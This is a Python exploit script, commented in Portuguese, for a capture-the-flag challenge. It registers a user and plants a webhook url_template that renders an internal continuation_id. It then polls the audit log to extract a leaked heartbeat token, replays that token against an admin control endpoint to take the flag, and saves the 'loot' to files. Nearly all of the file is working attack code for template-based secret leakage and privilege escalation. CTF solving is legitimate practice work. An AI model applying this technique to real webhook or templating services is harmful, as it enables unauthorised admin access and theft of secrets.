#!/usr/bin/env python3
"""
Exploit para o desafio Crosstalk.

Ideia técnica:
1. Registrar um usuário comum.
2. Criar uma subscription com um url_template contendo:
   {{actor.context.continuation_id}}
3. Esperar o evento interno system.heartbeat.
4. Ler /api/v2/audit/dispatches.
5. Extrair o HEARTBEAT_TOKEN vazado dentro do rendered_url.
6. Usar esse token no header X-Heartbeat-Token contra /api/v2/admin/control.
"""

import json
import re
import time
import sys
from urllib.parse import urlparse

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET_HOST = "898073117840408a.chal.ctf.ae"

# Testamos HTTPS primeiro porque os outros desafios da plataforma costumam responder em HTTPS,
# mas deixamos HTTP como fallback caso esse serviço esteja somente em HTTP.
BASE_URLS = [
    f"https://{TARGET_HOST}",
    f"http://{TARGET_HOST}",
]

USERNAME = "guerreiro"

# O token tem secrets.token_hex(24), então são 48 caracteres hexadecimais.
TOKEN_RE = re.compile(r"/leak/([0-9a-f]{48})(?:\?|/|$)", re.IGNORECASE)
FLAG_RE = re.compile(r"flag\{[^}\r\n]+\}", re.IGNORECASE)


def show_response(label, response):
    """Mostra resposta HTTP de forma útil para debugging."""
    print()
    print("=" * 90)
    print(label)
    print("=" * 90)
    print("[*] URL:", response.url)
    print("[*] Status:", response.status_code)
    print("[*] Content-Type:", response.headers.get("Content-Type", ""))

    text = response.text
    if len(text) > 2000:
        print(text[:2000] + "\n...[truncado]...")
    else:
        print(text)


def check_base_url(base_url):
    """Confirma se a aplicação responde nesse esquema."""
    try:
        response = requests.get(
            f"{base_url}/health",
            timeout=10,
            verify=False,
        )
        return response.status_code == 200 and "ok" in response.text.lower()
    except Exception:
        return False


def register_user(session, base_url):
    """Registra usuário comum e retorna o JWT."""
    response = session.post(
        f"{base_url}/api/auth/register",
        json={"username": USERNAME},
        timeout=15,
        verify=False,
    )

    show_response("REGISTRO DE USUÁRIO", response)
    response.raise_for_status()

    data = response.json()
    token = data["token"]
    user_id = data["user_id"]

    print("[+] user_id:", user_id)
    print("[+] JWT recebido")

    return token


def create_leaking_subscription(session, base_url, token):
    """
    Cria uma subscription com template que será renderizado contra eventos.

    O filtro permitido não inclui system.heartbeat, mas isso não importa para o bug,
    porque record_system_broadcast() ignora o filtro e grava uma linha de auditoria
    para todas as subscriptions ativas.
    """
    headers = {"Authorization": f"Bearer {token}"}

    body = {
        "name": "heartbeat-leak",
        "filter": "user.*",
        "url_template": (
            "https://guerreiro.invalid/leak/"
            "{{actor.context.continuation_id}}"
            "?event={{type}}&region={{region}}&ts={{ts}}"
        ),
    }

    response = session.post(
        f"{base_url}/api/v2/subscriptions",
        headers=headers,
        json=body,
        timeout=15,
        verify=False,
    )

    show_response("CRIAÇÃO DA SUBSCRIPTION MALICIOSA", response)
    response.raise_for_status()

    return response.json()


def poll_audit_for_heartbeat_token(session, base_url, token):
    """
    Consulta o audit log até aparecer uma linha system.heartbeat
    com rendered_url contendo o continuation_id.
    """
    headers = {"Authorization": f"Bearer {token}"}

    print()
    print("=" * 90)
    print("POLLING DO AUDIT LOG")
    print("=" * 90)
    print("[*] Aguardando system.heartbeat. Pode levar até cerca de 60 segundos.")

    deadline = time.time() + 95
    attempt = 0

    while time.time() < deadline:
        attempt += 1

        response = session.get(
            f"{base_url}/api/v2/audit/dispatches",
            headers=headers,
            timeout=15,
            verify=False,
        )

        print(f"[*] Tentativa {attempt}: status {response.status_code}")

        if response.status_code != 200:
            print(response.text[:500])
            time.sleep(5)
            continue

        try:
            entries = response.json()
        except Exception:
            print("[-] Resposta não é JSON:")
            print(response.text[:1000])
            time.sleep(5)
            continue

        # Salva a última visão do audit log para writeup/debug.
        with open("loot/script1_audit_latest.json", "w", encoding="utf-8") as f:
            json.dump(entries, f, indent=2, ensure_ascii=False)

        for entry in entries:
            rendered_url = entry.get("rendered_url", "")
            event_type = entry.get("event_type", "")

            match = TOKEN_RE.search(rendered_url)
            if match:
                heartbeat_token = match.group(1)

                print()
                print("[+] Vazamento encontrado no audit log")
                print("[+] event_type:", event_type)
                print("[+] rendered_url:", rendered_url)
                print("[+] HEARTBEAT_TOKEN:", heartbeat_token)

                with open("loot/script1_heartbeat_token.txt", "w", encoding="utf-8") as f:
                    f.write(heartbeat_token + "\n")

                return heartbeat_token

        time.sleep(5)

    raise RuntimeError("Não encontrei o HEARTBEAT_TOKEN no audit log dentro do tempo limite.")


def call_control_plane(session, base_url, heartbeat_token):
    """Usa o token vazado para acessar o control plane e obter a flag."""
    headers = {"X-Heartbeat-Token": heartbeat_token}

    response = session.get(
        f"{base_url}/api/v2/admin/control",
        headers=headers,
        timeout=15,
        verify=False,
    )

    show_response("ACESSO AO CONTROL PLANE", response)

    body = response.text
    match = FLAG_RE.search(body)

    if match:
        flag = match.group(0)
        print()
        print("=" * 90)
        print("[+] FLAG ENCONTRADA")
        print("=" * 90)
        print(flag)

        with open("flag.txt", "w", encoding="utf-8") as f:
            f.write(flag + "\n")

        print("[+] Flag salva em flag.txt")
        return True

    print("[-] Flag não encontrada na resposta do control plane.")
    return False


def main():
    session = requests.Session()

    for base_url in BASE_URLS:
        print()
        print("=" * 90)
        print("[*] Testando base URL:", base_url)
        print("=" * 90)

        if not check_base_url(base_url):
            print("[-] /health não respondeu corretamente nessa base URL.")
            continue

        print("[+] Base URL válida:", base_url)

        try:
            token = register_user(session, base_url)
            create_leaking_subscription(session, base_url, token)
            heartbeat_token = poll_audit_for_heartbeat_token(session, base_url, token)

            if call_control_plane(session, base_url, heartbeat_token):
                return 0

        except Exception as exc:
            print()
            print("[-] Falha nessa base URL:", repr(exc))
            continue

    print()
    print("=" * 90)
    print("[-] Exploit não concluiu")
    print("=" * 90)
    print("[*] Arquivos úteis:")
    print("    loot/script1_audit_latest.json")
    print("    loot/script1_heartbeat_token.txt")
    return 1


if __name__ == "__main__":
    sys.exit(main())
